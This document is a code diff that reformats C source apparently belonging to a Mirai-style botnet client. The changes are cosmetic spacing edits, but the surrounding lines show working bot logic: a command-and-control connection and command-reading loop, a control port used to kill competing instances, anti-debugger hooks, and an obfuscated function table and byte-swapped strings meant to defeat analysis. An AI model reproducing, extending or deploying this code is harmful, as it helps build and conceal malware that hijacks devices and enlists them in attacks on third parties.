@@ -39,7 +39,7 @@ void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in a
 #ifdef DEBUG
 static void segv_handler(int sig, siginfo_t *si, void *unused)
 {
-    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
+    printf("Got SIGSEGV at address: 0x%lx\n", (long)si->si_addr);
     exit(EXIT_FAILURE);
 }
 #endif
@@ -205,14 +205,14 @@ int main(int argc, char **args)
             uint16_t len = 0;
 
             if (pings++ % 6 == 0)
-                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
+                send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
         }
 
         // Check if we need to kill ourselves
         if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
         {
             struct sockaddr_in cli_addr;
-            socklen_t cli_addr_len = sizeof (cli_addr);
+            socklen_t cli_addr_len = sizeof(cli_addr);
 
             accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
 
@@ -243,7 +243,7 @@ int main(int argc, char **args)
             else
             {
                 int err = 0;
-                socklen_t err_len = sizeof (err);
+                socklen_t err_len = sizeof(err);
 
                 getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                 if (err != 0)
@@ -261,7 +261,7 @@ int main(int argc, char **args)
 
                     LOCAL_ADDR = util_local_addr();
                     send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
-                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
+                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                     if (id_len > 0)
                     {
                         send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
@@ -280,7 +280,7 @@ int main(int argc, char **args)
 
             // Try to read in buffer length from CNC
             errno = 0;
-            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
+            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
             if (n == -1)
             {
                 if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
@@ -288,7 +288,7 @@ int main(int argc, char **args)
                 else
                     n = 0; // Cause connection to close
             }
-            
+
             // If n == 0 then we close the connection!
             if (n == 0)
             {
@@ -302,11 +302,11 @@ int main(int argc, char **args)
             // Convert length to network order and sanity check length
             if (len == 0) // If it is just a ping, no need to try to read in buffer data
             {
-                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
+                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL); // skip buffer for length
                 continue;
             }
             len = ntohs(len);
-            if (len > sizeof (rdbuf))
+            if (len > sizeof(rdbuf))
             {
                 close(fd_serv);
                 fd_serv = -1;
@@ -334,7 +334,7 @@ int main(int argc, char **args)
             }
 
             // Actually read buffer length and buffer data
-            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
+            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
             len = ntohs(len);
             recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
 
@@ -402,7 +402,7 @@ static void establish_connection(void)
         resolve_func();
 
     pending_connection = TRUE;
-    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
+    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
 }
 
 static void teardown_connection(void)
@@ -425,16 +425,16 @@ static void ensure_single_instance(void)
 
     if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
         return;
-    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
+    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
     fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));
 
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
+    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127, 0, 0, 1)) : LOCAL_ADDR;
     addr.sin_port = htons(SINGLE_INSTANCE_PORT);
 
     // Try to bind to the control port
     errno = 0;
-    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
     {
         if (errno == EADDRNOTAVAIL && local_bind)
             local_bind = FALSE;
@@ -447,13 +447,13 @@ static void ensure_single_instance(void)
         addr.sin_addr.s_addr = INADDR_ANY;
         addr.sin_port = htons(SINGLE_INSTANCE_PORT);
 
-        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
         {
 #ifdef DEBUG
             printf("[main] Failed to connect to fd_ctrl to request process termination\n");
 #endif
         }
-        
+
         sleep(5);
         close(fd_ctrl);
         killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
@@ -483,17 +483,16 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
     char buf_src[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, buf_dst[12];
     int i, ii = 0, c = 0;
     uint8_t fold = 0xAF;
-    void (*obf_funcs[]) (void) = {
-        (void (*) (void))ensure_single_instance,
-        (void (*) (void))table_unlock_val,
-        (void (*) (void))table_retrieve_val,
-        (void (*) (void))table_init, // This is the function we actually want to run
-        (void (*) (void))table_lock_val,
-        (void (*) (void))util_memcpy,
-        (void (*) (void))util_strcmp,
-        (void (*) (void))killer_init,
-        (void (*) (void))anti_gdb_entry
-    };
+    void (*obf_funcs[])(void) = {
+        (void (*)(void))ensure_single_instance,
+        (void (*)(void))table_unlock_val,
+        (void (*)(void))table_retrieve_val,
+        (void (*)(void))table_init, // This is the function we actually want to run
+        (void (*)(void))table_lock_val,
+        (void (*)(void))util_memcpy,
+        (void (*)(void))util_strcmp,
+        (void (*)(void))killer_init,
+        (void (*)(void))anti_gdb_entry};
     BOOL matches;
 
     for (i = 0; i < 7; i++)
@@ -502,7 +501,7 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
         return FALSE;
 
     // We swap every 2 bytes: e.g. 1, 2, 3, 4 -> 2, 1, 4, 3
-    for (i = 0; i < sizeof (buf_src); i += 3)
+    for (i = 0; i < sizeof(buf_src); i += 3)
     {
         char tmp = buf_src[i];
 
@@ -518,13 +517,13 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
         // Mess with 0xAF
         fold += ~argv0[ii % util_strlen(argv0)];
     }
-    fold %= (sizeof (obf_funcs) / sizeof (void *));
-    
+    fold %= (sizeof(obf_funcs) / sizeof(void *));
+
 #ifndef DEBUG
     (obf_funcs[fold])();
     matches = util_strcmp(argv0, buf_dst);
-    util_zero(buf_src, sizeof (buf_src));
-    util_zero(buf_dst, sizeof (buf_dst));
+    util_zero(buf_src, sizeof(buf_src));
+    util_zero(buf_dst, sizeof(buf_dst));
     return matches;
 #else
     table_init();
